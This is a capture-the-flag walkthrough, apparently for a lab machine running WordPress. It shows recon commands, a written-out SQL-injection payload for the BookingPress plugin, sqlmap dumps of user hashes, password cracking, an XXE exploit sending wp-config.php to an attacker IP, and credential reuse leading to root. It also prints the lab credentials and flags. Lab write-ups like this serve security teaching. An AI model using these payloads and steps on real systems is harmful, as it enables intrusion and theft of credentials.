# Reconnaissance

## Port Scan (nmap)

**Command:**\
*sudo nmap -sC -sV -p- {IP address}*

**Command Description:**\
* -sC : Use default scripts
* -sV Service version
* -p- : Scan all ports
* {IP address} - Target host

**Results:**\
TCP Ports Open:
* 21 - FTP
* 22 - SSH
* 80 - HTTP

**Actions:**\
Edit */etc/hosts* and add the follwing line to display the website correctly on port 80 (HTTP): *{IP address} 	metapress.htb*

Looking at the page we can see that it is most likely WordPress. We can check the source code of http://metapress.htb/events/ or also use *Wappalyzer* extension to see that it is using WordPress with version 5.6.2.

![image](https://user-images.githubusercontent.com/85443537/226896247-4f303963-a538-4210-a13e-2759fa3cf1ed.png)

## Directory Scan (gobuster)

**Command:**\
*gobuster dir -u http://metapress.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt*

**Command Description:**
* dir : Directory scan
* -u : Target url
* -w : Directory wordlist

**Results:**\
The interesting directory that was found: */wp-admin*

**Actions:**\
Navigate to: *http://metapress.htb/wp-admin*

After navigating to wp-admin we find that it requires a login. We try default passwords but with no luck.

##  Finding possible WordPress vulnerabilities using WPScan (wpscan)

We type the following command to run the wordpress security scan.

**Command:**\
*wpscan --url metapress.htb --api-token {Your API-token}*

**Results:**\
We find a possible vulnerability "Authenticated XXE Within the Media Library Affecting PHP 8" for WordPress versions 5.6-5.7. The WordPress version of the webserver found was 5.6.2.

![image](https://user-images.githubusercontent.com/85443537/226898865-a6e1404a-e6a6-469f-bf6c-b7ad5882afea.png)

We look at the source code of the */events* page again and find that it is using bookingpress version 1.0.10.

![image](https://user-images.githubusercontent.com/85443537/226902782-7e98982f-d287-4d4e-b8d5-c5b94a3470db.png)

We navigate to the first link of "References" (https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5
) to learn more about how to exploit this identified vulnerability.

The description from the reference is: 
*The plugin fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection*

To exploit this we need to find the *_wpnonce* value which can also be found in the */events* source page.

![image](https://user-images.githubusercontent.com/85443537/226904218-d7a417bc-eb1f-494e-90e3-fc9cb5aa96ef.png)

_wpnonce = 8181f9cfbb

## Capturing the request using BurpSuite (burpsuite)

Open burpsuite and capture the request after running the following command in the terminal
Note: Replace the _wpnonce with your value.

*curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=8181f9cfbb&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' -x http://127.0.0.1:8080*
  
It should look something like this in burpsuite:

![image](https://user-images.githubusercontent.com/85443537/226907046-2f2c8226-58c7-41f1-bfa5-6b05dd10de46.png)

And giving you the response:

![image](https://user-images.githubusercontent.com/85443537/226907090-3a2404d4-df0b-4715-9384-6886c28a1236.png)

We then save the POST request to a file by right clicking on the request and choosing the option *Copy to file* (we call it bookingpress.req).

![image](https://user-images.githubusercontent.com/85443537/226907483-57fdd4b3-e9b0-4170-bab2-efb6be48bb77.png)

Edit the copied file and change the *total_service* value to any number, in our case we will put it as 1. Then remove the "Injection" part from the query so that the only thing that will be left is the following:
*action=bookingpress_front_get_category_services&_wpnonce=8181f9cfbb&category_id=33&total_service=1)*

The edited request file should look like this:

POST /wp-admin/admin-ajax.php HTTP/1.1\
Host: metapress.htb\
User-Agent: curl/7.87.0\
Accept: */*\
Content-Length: 185\
Content-Type: application/x-www-form-urlencoded\
Connection: close

action=bookingpress_front_get_category_services&_wpnonce=8181f9cfbb&category_id=33&total_service=1)

## Dumping Database using SQLMap (sqlmap)

Type the following command in the terminal to see if the parameter is injectable:

**Command:**\
*sqlmap -r bookingpress.req -p total_service --batch*

**Command Description:**\
* -r : Request file
* -p : Parameter
* --batch : Non-interactive session (do not ask for user input)

**Results:**\
The parameter is injectable.

We can now list the databases using the following command:

**Command:**\
*sqlmap -r bookingpress.req -p total_service --dbs*

**Results:**\
Tables: *blog* and *information_schema*

We look further into the blog database by writting the following command:

**Command:**\
*sqlmap -r bookingpress.req -p total_service -D blog --tables*

**Results:**\
We found an interesting table called *wp_users*

We look into the wp_users table by dumping it using the following command:

**Command:**\
*sqlmap -r bookingpress.req -p total_service -D blog -T wp_users --dump*

**Results:**\
We get two users that are interesting, *manager* and *admin*. We also get their corresponding hash.

![image](https://user-images.githubusercontent.com/85443537/226912431-c5ecffff-6fca-454b-a372-8a9ac0e7a6df.png)

To make it more visible we can use this command instead to get the username and hash only by looking into user_login and user_pass columns:

*sqlmap -r bookingpress.req -p total_service -D blog -T wp_users -C user_login,user_pass --batch --dump*

![image](https://user-images.githubusercontent.com/85443537/226911825-bb904bc3-cf60-4910-9583-c5dc56882d7a.png)

We save both hashes into a file called php-hashes.

![image](https://user-images.githubusercontent.com/85443537/226913360-b104a404-9100-4da0-8ad5-8c0c5acf2ee8.png)'


## Cracking the passwords using John The Ripper (john)

Use the following command to crack the passwords.

**Command:**\
*john -w=/usr/share/wordlists/rockyou.txt php-hashes*

**Results:**\
We get the password for the *manager* which is *partylikearockstar*

![image](https://user-images.githubusercontent.com/85443537/226914132-25ec1c4b-0fb8-4d43-9196-748acae9b051.png)

## Logging in

We can now use one of the cracked credentials from previous section and login into the admin panel on metapress.htb/wp-login.

![image](https://user-images.githubusercontent.com/85443537/226914629-85e86a0d-09b4-4c63-b296-37c62f47b3c5.png)


## Exploiting Authenticated XXE Within the Media Library Affecting PHP 8

We can now fully exploit the *Authenticated XXE Within the Media Library Affecting PHP 8* vulnerability that we found previously using wpscan since we are now authenticated.

We find the CVE on exploit-db.com (WordPress 5.7 - 'Media Library' XML External Entity Injection (XXE) (Authenticated)). We then copy and paste the code into a new file and call it *xxe.sh*.

![image](https://user-images.githubusercontent.com/85443537/226915959-e7cc6d8e-34c6-4ae2-8b1f-bab11ef03c71.png)

We then run the bash file (our exploit) we created and request the *wp-config.php* file using the following command:

Usage:

![image](https://user-images.githubusercontent.com/85443537/226917233-11fceba6-b8ba-43cd-a1d3-6bb3554432f9.png)

**Command:**\
*bash xxe.sh manager partylikearockstar ../wp-config.php {Attacker_IP}*

**Results:**\
We find some FTP credentials.

![image](https://user-images.githubusercontent.com/85443537/226917659-df9370b3-480f-46c1-b109-ecd8d1ccf5d3.png)

## Logging in to FTP

Now that we aquired some FTP credentials and we know that port 21 for FTP is open. We can login with the information.
FTP_USER: metapress.htb
FTP_PASS: 9NYS_ii@FyL_p5M2NvJ

Use the command:

*ftp metapress.htb@{Target_IP}*

Once logged in, there will be 2 directories.

![image](https://user-images.githubusercontent.com/85443537/226919083-82aac865-19f7-4836-8023-f8aea6a2a7f2.png)

Navigating to the mailer directory we find two other files.

![image](https://user-images.githubusercontent.com/85443537/226919594-a04894ad-b39c-4e12-a6c0-a906b4db9b40.png)

We check the content of *send_email.php* and find some credentials.\
Username = "jnelson@metapress.htb";\             
Password = "Cb4_JmWM8zUZWMu@Ys";  

![image](https://user-images.githubusercontent.com/85443537/226919791-ad886e48-7f80-452b-9152-e94ef871eece.png)

## SSH Session

Once we recieved the credentials from previous section from the FTP session. We try to log with ssh using the credentials.
*ssh jnelson@{Target_IP}*

We get a shell.

We find the user.txt flag.

Now run the following command to show all files (including hidden files):
*ls -la*

We find a hidden directory called *.passpie* which the user jnelson have access too.

In the *ssh* directory we also find two files *jnelson.pass* and *root.pass*.
We are interested in the *root.pass*.

![image](https://user-images.githubusercontent.com/85443537/226926279-7c8ba7d7-2309-49a0-b019-a03d1d533e0e.png)

We copy only the data thats after the *password* field and paste it into another file (encryptedpgp).

-----BEGIN PGP MESSAGE-----


  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2

  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km

  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED

  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf

  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg

  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw

  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr

  lpF0RatbxQGWBks5F3o=

  =uh1B

  -----END PGP MESSAGE-----


Navigating to the hidden directory and typing the command *ls -la* we find another hidden file called *.keys*.
We extract and copy the PGP PRIVATE KEY BLOCK into another file called *privkey*.

![image](https://user-images.githubusercontent.com/85443537/226922484-8891c7b5-246f-45f6-b09b-3bbb5443777d.png)

Now we can attempt to crack the password by first turning it into a format that John the Ripper can handle.
We type the following command to do that:

*/usr/sbin/gpg2john privkey > privkeyhash*

We then crack the password using the following command:

*john -w=/usr/share/wordlists/rockyou.txt privkeyhash*

The cracked password is *blink182*.

Once the password is cracked we can proceed to import the private key using the following command:

*gpg --import privkey*
 
And then we can list the keys:

*gpg --list-secret-keys*

![image](https://user-images.githubusercontent.com/85443537/226925514-05e22264-c474-40d9-88d9-c8a80803dff0.png)

Once we have that imported we can try to decrypt the encrypted password found in the *root.pass* file.
We type the following command to decrypt the password we saved in the *encryptedpgp* file:

*gpg --output decryptedpgp --decrypt encryptedpgp*

Looking at the newly generated decrypted file we get the password *p7qfAZt4_A1xo_0x*.

We change the user in current session to root using the *su root* command and then type the decrypted password.
We then become root and can get the *root.txt* flag.

![image](https://user-images.githubusercontent.com/85443537/226929906-a5cabaff-740e-48c9-8c42-251baba230b7.png)


# Goals

* USER FLAG: 8f6970dd94ee32701025173ee96cf76f
* ROOT FLAG: 6c752d9907b5e1591e36076f247d901c

